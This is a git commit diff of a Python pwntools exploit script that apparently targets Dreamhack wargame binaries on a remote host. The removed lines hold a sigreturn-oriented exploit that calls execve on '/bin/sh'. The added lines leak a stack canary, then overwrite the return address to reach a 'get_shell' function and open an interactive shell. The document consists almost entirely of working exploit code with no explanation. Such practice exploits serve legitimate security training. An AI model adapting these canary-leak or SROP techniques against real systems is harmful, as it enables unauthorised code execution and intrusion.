bb48e3acb14b4ec74e5d61ee39c80fd65531e027
pocas <49112423+wjddnjs33@users.noreply.github.com>
2021-05-20 18:37:23 +0900

    Update ex.py

--- ex.py
+++ ex.py
@@ -1,47 +1,19 @@
 #!/usr/bin/env python3
 
 from pwn import *
-
+import time
 context.log_level = "debug"
 
-e = ELF("./send_sig")
+e = ELF("./master_canary")
 HOST = "host1.dreamhack.games"
-PORT = 8794
-#HOST = "127.0.0.1"
-#PORT = 12343
+PORT = 11525
 conn = remote(HOST, PORT)
 
-#conn = process("./send_sig")
-pop_rax_ret = 0x00000000004010ae #: pop rax ; ret
-syscall =     0x00000000004010b0 #: syscall
-binsh =       0x0000000000402000
-
-payload = b"\x90" * 0x10
-payload += p64(pop_rax_ret)
-payload += p64(0x0f)
-payload += p64(syscall)
-
-"""
-payload += p64(0x00) * 13 # padding
-payload += p64(binsh) #rdi
-payload += p64(0x00) * 4
-payload += p64(0x3b) #rax
-payload += p64(0x00)*2
-payload += p64(syscall)
-payload += p64(0x00)
-payload += p64(0x33)
-payload += p64(0)*2
-payload += p64(0x2b)
-payload = payload.ljust(288, b'\x00')
-"""
-
-frame = SigreturnFrame(arch="amd64")
-frame.rax = 0x3b
-frame.rdi = binsh
-frame.rsp = syscall
-frame.rip = syscall
-
-payload += bytes(frame)
-
-conn.sendafter("Signal:", payload)
+conn.sendlineafter("> ", "1")
+conn.sendlineafter("> ", "2")
+conn.sendlineafter("Size: ", str(int(0x8e9)))
+conn.sendlineafter("Data: ", b"\x90"*0x8e9)
+stack_guard = b"\x00"+conn.recv()[-15:-8]
+conn.sendline(b"3\n"+(b"\x90"*0x28)+stack_guard+b"\x90"*8+p64(e.symbols["get_shell"]))
+conn.recv()
 conn.interactive()
